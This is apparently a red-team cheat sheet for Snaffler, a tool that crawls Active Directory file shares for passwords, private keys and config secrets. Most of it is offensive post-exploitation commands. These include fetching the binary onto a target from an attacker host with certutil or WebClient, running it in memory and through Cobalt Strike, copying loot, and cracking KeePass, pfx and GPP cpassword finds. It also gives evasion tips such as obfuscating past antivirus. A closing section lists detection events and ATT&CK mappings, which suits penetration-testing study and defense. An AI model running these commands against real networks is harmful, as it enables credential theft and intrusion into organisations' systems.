---
title: "Snaffler"
description: "Snaffler share-crawling for credentials, keys and sensitive files across SMB with tuning rules."
category: tools
tags: [credentials, shares, enumeration]
tools: [Snaffler]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:ActiveDirectory/Snaffler.md"
---

# 🔍 Snaffler — Complete Cheat Sheet
> **Author:** Netrunner | **Tags:** `Credential Hunting` `File Shares` `AD` `Red Team` `Post-Exploitation`

---

## 📋 Table of Contents
1. [What is Snaffler?](#what-is-snaffler)
2. [How It Works](#how-it-works)
3. [Getting Snaffler onto a Target](#getting-snaffler-onto-a-target)
4. [Basic Usage](#basic-usage)
5. [Target Specification](#target-specification)
6. [Share Discovery Options](#share-discovery-options)
7. [File Discovery & Snaffling](#file-discovery--snaffling)
8. [Output Formats & Logging](#output-formats--logging)
9. [Triage Levels — Understanding Results](#triage-levels--understanding-results)
10. [Custom Rules (TOML Configuration)](#custom-rules-toml-configuration)
11. [Performance Tuning](#performance-tuning)
12. [Parsing & Post-Processing Results](#parsing--post-processing-results)
13. [Real-World Attack Workflows](#real-world-attack-workflows)
14. [OPSEC Tips](#opsec-tips)
15. [Detection & Indicators](#detection--indicators)
16. [Common Errors & Fixes](#common-errors--fixes)
17. [Quick Reference Card](#quick-reference-card)

---

## What is Snaffler?

Snaffler is a C# tool for **finding sensitive data across Active Directory file shares**. It automatically discovers domain-joined computers, enumerates their SMB shares, and recursively searches for files containing credentials, secrets, configuration data, and other high-value targets.

**Core capabilities:**
- Auto-discovers domain computers via LDAP
- Enumerates SMB/CIFS shares on all discovered hosts
- Searches files by name, extension, content, and regex patterns
- Classifies findings by severity (Black → Red → Yellow → Green)
- Optionally copies ("snaffles") interesting files to a collection directory
- Fully customizable rules via TOML configuration files

> **GitHub:** `https://github.com/SnaffCon/Snaffler`

---

## How It Works

```
                    ┌────────────────────┐
                    │ Active Directory   │
                    │ (LDAP Query)       │
                    └───────┬────────────┘
                            │ 1. Query for domain
                            │    computer objects
                            ▼
                    ┌────────────────────┐
                    │ Computer Discovery │
                    │ DC01, WEB01, DB01  │
                    └───────┬────────────┘
                            │ 2. Enumerate SMB shares
                            │    on each computer
                            ▼
                    ┌────────────────────┐
                    │ Share Enumeration  │
                    │ \\DC01\SYSVOL      │
                    │ \\WEB01\wwwroot    │
                    │ \\DB01\backup$     │
                    └───────┬────────────┘
                            │ 3. Recursively walk
                            │    accessible shares
                            ▼
                    ┌────────────────────┐
                    │ File Classification│
                    │ Match by name,     │
                    │ extension, content │
                    └───────┬────────────┘
                            │ 4. Report & optionally
                            │    copy matched files
                            ▼
                    ┌────────────────────┐
                    │ Output: Console,   │
                    │ Log File, TSV      │
                    └────────────────────┘
```

**Key principle:** Snaffler runs as the **current user**. It can only access shares your user account has read permissions to. A low-privilege domain user will still often find plenty — SYSVOL, department shares, IT scripts folders, etc.

---

## Getting Snaffler onto a Target

```powershell
# From your attacking machine — host it
python3 -m http.server 80

# On target — download
certutil -urlcache -f http://10.10.14.x/Snaffler.exe C:\Windows\Temp\Snaffler.exe
iwr -uri http://10.10.14.x/Snaffler.exe -outfile C:\Windows\Temp\Snaffler.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/Snaffler.exe', 'C:\Windows\Temp\Snaffler.exe')

# Via Evil-WinRM
upload Snaffler.exe

# In-memory execution (.NET assembly loading)
$data = (New-Object Net.WebClient).DownloadData('http://10.10.14.x/Snaffler.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[SnafflerApp.Program]::Main(@("-s", "-o", "snaffler.log"))

# Via Cobalt Strike
beacon> execute-assembly /path/to/Snaffler.exe -s -o snaffler.log
```

---

## Basic Usage

```powershell
# Simplest usage — output to console and log file
Snaffler.exe -s -o snaffler.log

# Just console output (no log file)
Snaffler.exe -s

# Just log file (quiet — no console output)
Snaffler.exe -o snaffler.log

# Specify domain explicitly
Snaffler.exe -s -o snaffler.log -d PAINTERS.HTB

# Specify domain controller
Snaffler.exe -s -o snaffler.log -d PAINTERS.HTB -c DC01.painters.htb

# Full verbose run with domain and DC specified
Snaffler.exe -s -o snaffler.log -d PAINTERS.HTB -c DC01.painters.htb -v Trace
```

### Verbosity Levels

| Flag | Level | Details |
|------|-------|---------|
| (default) | `Info` | Standard findings only |
| `-v Data` | Data | Findings + file content matches |
| `-v Degub` | Debug | Detailed operational info |
| `-v Trace` | Trace | Everything — extremely verbose |

---

## Target Specification

### Auto-Discovery (Default)
```powershell
# Let Snaffler query AD for all domain computers (default behavior)
Snaffler.exe -s -o snaffler.log
```

### Manual Host List
```powershell
# Disable domain discovery — provide specific hosts
Snaffler.exe -s -o snaffler.log -n DC01,WEB01,DB01,FS01

# Read targets from a file (one hostname/IP per line)
Snaffler.exe -s -o snaffler.log -n targets.txt
```

### Scan a Specific Path (No Discovery)
```powershell
# Skip computer AND share discovery — scan a local or UNC path directly
Snaffler.exe -s -o snaffler.log -i "\\FS01\departmentshare"
Snaffler.exe -s -o snaffler.log -i "C:\Users\admin\Desktop"
```

---

## Share Discovery Options

### Default Share Enumeration
```powershell
# Enumerate all accessible shares on all discovered hosts (default)
Snaffler.exe -s -o snaffler.log
```

### DFS Shares Only (Stealthier)
```powershell
# Only discover DFS (Distributed File System) shares
# Often considered sneakier — less share-enumeration noise
Snaffler.exe -s -o snaffler.log -f
```

### Share Enumeration Only (No File Search)
```powershell
# Just list accessible shares — don't look inside them
# Great for recon / scoping before a full scan
Snaffler.exe -s -o snaffler.log -a

# Example output:
# [Share] \\DC01\SYSVOL
# [Share] \\DC01\NETLOGON
# [Share] \\FS01\Users$
# [Share] \\FS01\IT_Scripts
# [Share] \\WEB01\wwwroot
```

---

## File Discovery & Snaffling

### Standard File Search
```powershell
# Default — search files using built-in rules
Snaffler.exe -s -o snaffler.log
```

### Copy Matched Files ("Snaffling")
```powershell
# Automatically copy interesting files to a local directory
Snaffler.exe -s -o snaffler.log -m C:\loot\snaffled

# Limit file size for copies (default is 10MB / 10,000,000 bytes)
Snaffler.exe -s -o snaffler.log -m C:\loot\snaffled -l 5000000

# Copy only files under 1MB
Snaffler.exe -s -o snaffler.log -m C:\loot\snaffled -l 1000000
```

### Content Search Tuning
```powershell
# Set max file size to search INSIDE for sensitive strings
# Default: 500KB (500,000 bytes)
Snaffler.exe -s -o snaffler.log -r 1000000

# Reduce to 100KB for faster scanning (less thorough)
Snaffler.exe -s -o snaffler.log -r 100000
```

### AD Username Enrichment
```powershell
# Extract AD account names and build dynamic search rules
# Searches for files/content referencing specific usernames
Snaffler.exe -s -o snaffler.log -u
```

---

## Output Formats & Logging

### Standard Output (Human Readable)
```powershell
# Console + log file
Snaffler.exe -s -o snaffler.log
```

### TSV Output (Machine Parseable)
```powershell
# Output in Tab-Separated Values format
# Ideal for piping into grep, awk, Excel, or custom parsers
Snaffler.exe -s -o snaffler.tsv -y
```

### Understanding Output Lines

```
# Standard output format:
{TriageLevel} {Timestamp} {RuleName} {MatchLocation} {FilePath} {FileSize} {ModifiedDate} {MatchContext}

# Example outputs:
[Black] 2026-04-04 14:23:01 KeepKeePassRed FileExtension \\FS01\IT\passwords.kdbx 2048 2025-11-01
[Red]   2026-04-04 14:23:05 KeepCertContainsPrivKeyRed FileExtension \\DC01\SYSVOL\cert.pfx 4096 2025-09-15
[Yellow] 2026-04-04 14:23:10 ConfigContentYellow Content \\WEB01\wwwroot\web.config 1024 2025-12-01 "connectionString=...password=SecretPass..."
[Green] 2026-04-04 14:24:00 InterestingExtGreen FileExtension \\FS01\Scripts\deploy.ps1 8192 2026-01-10
```

---

## Triage Levels — Understanding Results

Snaffler classifies every finding into one of four severity levels:

| Level | Color | Meaning | Priority | Examples |
|-------|-------|---------|----------|----------|
| **Black** | ⬛ | Immediate high-value win | 🔴 Critical | `.kdbx` (KeePass), `.ppk` (PuTTY keys), private keys, password vaults |
| **Red** | 🟥 | Significant — investigate now | 🟠 High | `.pfx` / `.p12` certs with private keys, config files with embedded creds |
| **Yellow** | 🟨 | Moderate interest | 🟡 Medium | Config files, scripts with possible credentials, `.xml` with settings |
| **Green** | 🟩 | Low priority / informational | 🟢 Low | Interesting extensions, scripts, documentation that might contain info |

### What to Investigate First

```
Priority 1 (Black): Password databases, private keys, vault files
  → Crack KeePass DBs, use private keys for auth, extract vault secrets

Priority 2 (Red): Certificate files, config files with passwords
  → Import certs for auth, extract plaintext passwords from configs

Priority 3 (Yellow): Web configs, scripts, connection strings
  → Check for hardcoded passwords, database connection strings, API keys

Priority 4 (Green): Scripts, documentation, interesting files
  → Manual review for embedded credentials or useful information
```

### Useful Grep Patterns for Snaffler Output

```bash
# Filter by triage level
grep "\[Black\]" snaffler.log
grep "\[Red\]" snaffler.log
grep -E "\[(Black|Red)\]" snaffler.log

# Find specific file types
grep "\.kdbx" snaffler.log
grep "\.pfx" snaffler.log
grep "\.config" snaffler.log
grep "web\.config" snaffler.log

# Find password matches in content
grep -i "password" snaffler.log
grep -i "connectionstring" snaffler.log

# Count findings by level
grep -c "\[Black\]" snaffler.log
grep -c "\[Red\]" snaffler.log
grep -c "\[Yellow\]" snaffler.log
grep -c "\[Green\]" snaffler.log
```

---

## Custom Rules (TOML Configuration)

### Generate Default Config Template

```powershell
# Generate a default.toml with all rules for customization
Snaffler.exe -z generate

# This creates a .toml file you can edit and reload
```

### Load Custom Rules

```powershell
# Point Snaffler to a directory containing your custom .toml rules
# NOTE: This REPLACES the default rules, not adds to them
Snaffler.exe -s -o snaffler.log -p C:\rules\custom_rules\
```

### TOML Rule Structure

```toml
# Each rule is defined under ClassifierRules
# Multiple rules can exist in a single .toml file

ClassifierRules
EnumerationScope = "FileEnumeration"    # When this rule runs
RuleName = "MyCustomRule"               # Descriptive name
MatchAction = "Snaffle"                 # What to do on match
MatchLocation = "FileExtension"         # What to check
WordListType = "Exact"                  # How to match
WordList = [".kdbx", ".ppk"]            # What to match against
Triage = "Black"                        # Severity classification
```

### Rule Components Explained

| Component | Options | Description |
|-----------|---------|-------------|
| `EnumerationScope` | `ShareEnumeration`, `DirectoryEnumeration`, `FileEnumeration`, `FileContent` | Stage where rule runs |
| `MatchAction` | `Snaffle` (report/copy), `Discard` (ignore), `CheckForInterest`, `Relay` | Action on match |
| `MatchLocation` | `FileExtension`, `FileName`, `FilePath`, `Path`, `Content` | What attribute to check |
| `WordListType` | `Exact`, `Contains`, `Regex`, `EndsWith`, `StartsWith` | Matching method |
| `Triage` | `Black`, `Red`, `Yellow`, `Green` | Severity assignment |

### Example Custom Rules

#### Rule: Find Password Databases
```toml
ClassifierRules
EnumerationScope = "FileEnumeration"
RuleName = "KeepPasswordDatabasesBlack"
MatchAction = "Snaffle"
MatchLocation = "FileExtension"
WordListType = "Exact"
WordList = [".kdbx", ".kdb", ".1pif", ".agilekeychain", ".opvault", ".enpass", ".psafe3", ".dash"]
Triage = "Black"
```

#### Rule: Find SSH/SSL Private Keys
```toml
ClassifierRules
EnumerationScope = "FileEnumeration"
RuleName = "KeepPrivateKeysBlack"
MatchAction = "Snaffle"
MatchLocation = "FileExtension"
WordListType = "Exact"
WordList = [".pem", ".ppk", ".key", ".pvk", ".p12", ".pfx", ".jks", ".keystore"]
Triage = "Black"
```

#### Rule: Find Hardcoded Passwords in Config Files
```toml
ClassifierRules
EnumerationScope = "FileContent"
RuleName = "FindHardcodedPasswordsRed"
MatchAction = "Snaffle"
MatchLocation = "Content"
WordListType = "Regex"
WordList = ["(?i)(password|passwd|pwd)\\s*[:=]\\s*['\"]?[a-zA-Z0-9!@#$%^&*()_+]{6,}"]
Triage = "Red"
```

#### Rule: Find AWS/Azure/GCP Credentials
```toml
ClassifierRules
EnumerationScope = "FileContent"
RuleName = "FindCloudCredsRed"
MatchAction = "Snaffle"
MatchLocation = "Content"
WordListType = "Regex"
WordList = [
    "AKIA[0-9A-Z]{16}",
    "(?i)aws_secret_access_key\\s*[:=]",
    "(?i)azure_client_secret\\s*[:=]",
    "(?i)GOOGLE_APPLICATION_CREDENTIALS"
]
Triage = "Red"
```

#### Rule: Exclude Noisy Directories
```toml
ClassifierRules
EnumerationScope = "DirectoryEnumeration"
RuleName = "DiscardNoisyDirs"
MatchAction = "Discard"
MatchLocation = "Path"
WordListType = "Contains"
WordList = [
    "\\windows\\winsxs",
    "\\$recycle.bin",
    "\\windows\\servicing",
    "\\windows\\assembly",
    "\\windows\\installer",
    "\\windows\\logs",
    "\\program files\\windowsapps"
]
```

#### Rule: Find Group Policy Preference Files (cpassword)
```toml
ClassifierRules
EnumerationScope = "FileEnumeration"
RuleName = "KeepGPPFilesBlack"
MatchAction = "Snaffle"
MatchLocation = "FileName"
WordListType = "Exact"
WordList = ["Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml"]
Triage = "Black"
```

---

## Performance Tuning

```powershell
# Large environments can take hours. Here's how to speed things up:

# 1. Scope down — target specific hosts instead of full domain
Snaffler.exe -s -o snaffler.log -n DC01,FS01,FS02

# 2. Use DFS-only mode to reduce share enumeration noise
Snaffler.exe -s -o snaffler.log -f

# 3. Reduce content search file size (default 500KB → 100KB)
Snaffler.exe -s -o snaffler.log -r 100000

# 4. Start with share-only recon, then target interesting shares
Snaffler.exe -s -o shares_only.log -a
# Review → then target specific paths:
Snaffler.exe -s -o targeted.log -i "\\FS01\IT_Scripts"

# 5. Use custom rules that exclude noisy directories (see TOML section)

# 6. Run during business hours when systems are online
# (computers must be on and accessible via SMB)
```

---

## Parsing & Post-Processing Results

### Quick Bash One-Liners

```bash
# Show only Black and Red findings (highest value)
grep -E "\[(Black|Red)\]" snaffler.log

# Extract just the file paths from results
awk -F'\t' '{print $5}' snaffler.tsv

# Sort findings by triage level (Black first)
sort -t'[' -k2 snaffler.log

# Get unique file extensions found
grep -oP '\.\w+(?=\s)' snaffler.log | sort -u

# Count findings per host
grep -oP '\\\\[^\\]+' snaffler.log | sort | uniq -c | sort -rn

# Find all .config files with passwords
grep -i "password" snaffler.log | grep -i "\.config"

# Extract connection strings
grep -i "connectionstring" snaffler.log

# Find all KeePass databases
grep "\.kdbx" snaffler.log
```

### PowerShell Parsing

```powershell
# Import TSV output
$results = Import-Csv -Path snaffler.tsv -Delimiter "`t"

# Filter by triage level
$critical = $results | Where-Object { $_.Triage -eq "Black" -or $_.Triage -eq "Red" }

# Group by rule name
$results | Group-Object -Property RuleName | Sort-Object Count -Descending

# Export critical findings to CSV
$critical | Export-Csv -Path critical_findings.csv -NoTypeInformation
```

### SnafflerParser (Community Tool)

```bash
# Community tool for converting Snaffler output to HTML reports
# GitHub: https://github.com/SpaceCowboy-71/SnafflerParser

# Generate an HTML report from Snaffler log
python3 SnafflerParser.py -i snaffler.log -o report.html

# Generate sorted/filtered output
python3 SnafflerParser.py -i snaffler.log -o report.html --min-triage Red
```

---

## Real-World Attack Workflows

### Workflow 1: Initial Domain Recon Sweep

```powershell
# Step 1: Quick share-only recon (fast, low noise)
Snaffler.exe -s -o shares_recon.log -a

# Step 2: Review accessible shares
type shares_recon.log

# Step 3: Full scan with logging
Snaffler.exe -s -o full_scan.log

# Step 4: Prioritize findings
# On Kali, pull the log:
grep -E "\[(Black|Red)\]" full_scan.log
```

### Workflow 2: GPP Password Hunt (SYSVOL)

```powershell
# Target SYSVOL specifically for Group Policy Preference cpasswords
Snaffler.exe -s -o gpp_hunt.log -i "\\DC01\SYSVOL"

# If you find Groups.xml / Services.xml with cpassword:
# Decrypt the cpassword using gpp-decrypt
gpp-decrypt <cpassword_base64_value>

# Or use crackmapexec
crackmapexec smb DC01 -u user -p pass -M gpp_autologin
crackmapexec smb DC01 -u user -p pass -M gpp_password
```

### Workflow 3: Targeted IT/Admin Share Hunt

```powershell
# Step 1: Identify IT-related shares from recon
Snaffler.exe -s -o shares.log -a
# Look for: IT_Scripts, Admin$, Backup, Deploy, Software

# Step 2: Target those shares specifically
Snaffler.exe -s -o it_scripts.log -i "\\FS01\IT_Scripts"
Snaffler.exe -s -o backups.log -i "\\FS01\Backups"

# Step 3: Look for scripts with hardcoded credentials
grep -i "password" it_scripts.log
grep -i "credential" it_scripts.log
grep -i "runas" it_scripts.log

# Step 4: Copy interesting files locally for deeper review
Snaffler.exe -s -o targeted.log -i "\\FS01\IT_Scripts" -m C:\loot\snaffled -l 5000000
```

### Workflow 4: Web.config Credential Extraction

```powershell
# Scan web server shares for config files
Snaffler.exe -s -o webconfigs.log -n WEB01,WEB02,APP01

# Parse results for connection strings
grep -i "connectionstring" webconfigs.log
grep -i "password" webconfigs.log
grep -i "appSettings" webconfigs.log

# Common web.config credential patterns:
#   <add key="DBPassword" value="SecretPass123" />
#   connectionString="Server=DB01;Database=app;User=sa;Password=P@ss;"
#   <identity impersonate="true" userName="DOMAIN\svc" password="..." />
```

### Workflow 5: Certificate & Key Hunting

```powershell
# Hunt for certificate files across the domain
Snaffler.exe -s -o certs.log

# Filter for cert-related findings
grep -E "\.(pfx|p12|pem|key|pvk|ppk|jks)" certs.log

# If you find a .pfx file:
# 1. Copy it locally
copy "\\FS01\Certs\wildcard.pfx" C:\loot\

# 2. Try to import without password
certutil -importpfx C:\loot\wildcard.pfx

# 3. Or use Certipy to authenticate with the cert (from Linux)
certipy auth -pfx wildcard.pfx -dc-ip 10.10.11.x

# If password-protected, crack with pfx2john + john/hashcat
pfx2john wildcard.pfx > pfx_hash.txt
john pfx_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## OPSEC Tips

```
✅ Run during business hours — more hosts will be online and accessible

✅ Use -a (share-only) first to scope before full scanning
   Reduces time on target and lets you prioritize

✅ Use targeted scans (-n or -i) instead of full domain sweeps
   Less network noise, faster results, harder to detect

✅ Use DFS mode (-f) when possible — less share enumeration traffic

✅ Pipe output to a file (-o) and exfiltrate the log later
   Avoid leaving console output in C2 logs/screenshots

✅ Use TSV output (-y) for cleaner parsing — no need to re-run

✅ Scope down content search size (-r) to reduce time on target

✅ Run via execute-assembly in C2 — avoid dropping binary to disk

⚠️ Snaffler generates SIGNIFICANT SMB traffic across many hosts
   Security teams monitoring NetFlow/SMB logs will notice

⚠️ Accessing many shares rapidly looks like SMB enumeration
   IDS rules exist for rapid share access patterns

⚠️ Copying files (-m flag) generates even more SMB traffic
   Only snaffle files you specifically need

⚠️ Running from a workstation that doesn't normally access many shares
   is an anomaly that UEBA/behavior analytics will flag
```

---

## Detection & Indicators

| Indicator | Details |
|-----------|---------|
| **SMB traffic volume** | Rapid connections to many hosts on port 445 |
| **Share enumeration** | Multiple `NetShareEnumAll` RPC calls in logs |
| **File access patterns** | Reading many files across many shares in short time |
| **Event 5140** | Network share was accessed (Windows Security Log) |
| **Event 5145** | Detailed file share access audit (file-level) |
| **Event 4624** | Logon events from share access across multiple hosts |
| **Binary signatures** | Snaffler.exe is known to most AV / EDR |
| **Process name** | `Snaffler.exe` process name in EDR telemetry |
| **LDAP queries** | Computer object enumeration via LDAP to find targets |

### MITRE ATT&CK Mapping

| Technique | TTP ID |
|-----------|--------|
| Network Share Discovery | T1135 |
| Data from Network Shared Drive | T1039 |
| Unsecured Credentials: Credentials in Files | T1552.001 |
| File and Directory Discovery | T1083 |
| Remote System Discovery | T1018 |
| Automated Collection | T1119 |

---

## Common Errors & Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| No computers found | Not running as domain user / wrong domain | Use `-d DOMAIN.HTB` and `-c DC01.domain.htb` |
| Access denied to all shares | Current user has no share permissions | Try with higher-privileged credentials |
| Very few results | Default rules don't match your target files | Write custom TOML rules for your engagement |
| Scan runs forever | Huge environment with many computers/shares | Scope down with `-n` or `-i`, reduce `-r` size |
| `System.DirectoryServices` error | Missing .NET dependencies | Target has old .NET — build for .NET 3.5 |
| No output at all | Forgot `-s` flag (console output) | Add `-s` for stdout or `-o` for log file |
| Binary blocked by AV | Snaffler.exe is signatured | Use `execute-assembly` via C2, obfuscate, or recompile |
| `Access is denied.` on specific shares | ACL blocks your user | Expected behavior — focus on accessible shares |
| TSV output garbled | Special characters in file paths | Use PowerShell `Import-Csv` with backtick-t delimiter |
| Missing computers in scan | Hosts are offline | Run during business hours when workstations are on |

---

## Quick Reference Card

```
═══════════════════════════════════════════════════════════════════
  SNAFFLER QUICK REFERENCE
═══════════════════════════════════════════════════════════════════

BASIC SCAN:         Snaffler.exe -s -o snaffler.log
WITH DOMAIN:        Snaffler.exe -s -o snaffler.log -d DOMAIN.HTB
WITH DC:            Snaffler.exe -s -o snaffler.log -d DOMAIN.HTB -c DC01.domain.htb

TARGET HOSTS:       Snaffler.exe -s -o snaffler.log -n DC01,FS01,WEB01
TARGET PATH:        Snaffler.exe -s -o snaffler.log -i "\\FS01\share"

DFS ONLY:           Snaffler.exe -s -o snaffler.log -f
SHARES ONLY:        Snaffler.exe -s -o snaffler.log -a

COPY FILES:         Snaffler.exe -s -o snaffler.log -m C:\loot\snaffled
MAX COPY SIZE:      Snaffler.exe -s -o snaffler.log -m C:\loot -l 5000000
CONTENT SIZE:       Snaffler.exe -s -o snaffler.log -r 100000

TSV OUTPUT:         Snaffler.exe -s -o snaffler.tsv -y
VERBOSE:            Snaffler.exe -s -o snaffler.log -v Trace
AD USERNAMES:       Snaffler.exe -s -o snaffler.log -u

CUSTOM RULES:       Snaffler.exe -s -o snaffler.log -p C:\rules\
GENERATE RULES:     Snaffler.exe -z generate

═══════════════════════════════════════════════════════════════════
  FLAG REFERENCE
═══════════════════════════════════════════════════════════════════

-s              → Output to console (stdout)
-o <path>       → Save output to log file
-d <domain>     → Specify target domain
-c <dc>         → Specify domain controller
-n <hosts>      → Manual host list (comma-separated or file)
-i <path>       → Scan specific path (skip discovery)
-f              → DFS shares only (stealthier)
-a              → Share enumeration only (no file search)
-m <dir>        → Copy matched files to directory
-l <bytes>      → Max file size to copy (default: 10MB)
-r <bytes>      → Max file size to content-search (default: 500KB)
-u              → Use AD usernames for dynamic rules
-y              → TSV output format
-v <level>      → Verbosity: Info|Data|Debug|Trace
-z generate     → Generate default TOML config
-p <dir>        → Load custom TOML rules from directory

═══════════════════════════════════════════════════════════════════
  TRIAGE LEVELS
═══════════════════════════════════════════════════════════════════

⬛ BLACK  → Highest value  → Password DBs, private keys, vaults
🟥 RED    → High value     → Certs with keys, configs with creds
🟨 YELLOW → Medium value   → Scripts, configs, connection strings
🟩 GREEN  → Low / info     → Interesting files, documentation

═══════════════════════════════════════════════════════════════════
  COMMON FILE TARGETS
═══════════════════════════════════════════════════════════════════

.kdbx / .kdb        → KeePass databases (crack with keepass2john)
.pfx / .p12         → Certificates with private keys
.ppk                → PuTTY private keys
.pem / .key         → SSL/SSH private keys
web.config          → ASP.NET config (connection strings)
Groups.xml          → GPP passwords (decrypt with gpp-decrypt)
unattend.xml        → Autologon credentials
.ps1 / .bat / .cmd  → Scripts with hardcoded credentials
.ini / .conf        → Configuration files
.rdg / .rdp         → Remote Desktop saved connections
```

---

> **Sources:** Snaffler GitHub (SnaffCon/Snaffler) | SnafflerParser (SpaceCowboy-71) | HackTricks | MITRE ATT&CK
